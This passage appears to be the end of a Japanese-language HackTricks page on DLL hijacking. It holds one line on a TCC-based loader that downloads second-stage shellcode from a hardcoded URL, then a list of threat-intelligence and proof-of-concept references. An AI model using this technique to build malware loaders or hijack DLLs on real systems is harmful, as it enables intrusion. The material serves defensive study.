- この TCC-based の compile-and-run ステージは実行時に `Wininet.dll` をインポートし、ハードコードされた URL から second-stage shellcode を取得することで、コンパイラ実行を装う柔軟なローダーを実現していた。

## 参考資料

- [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
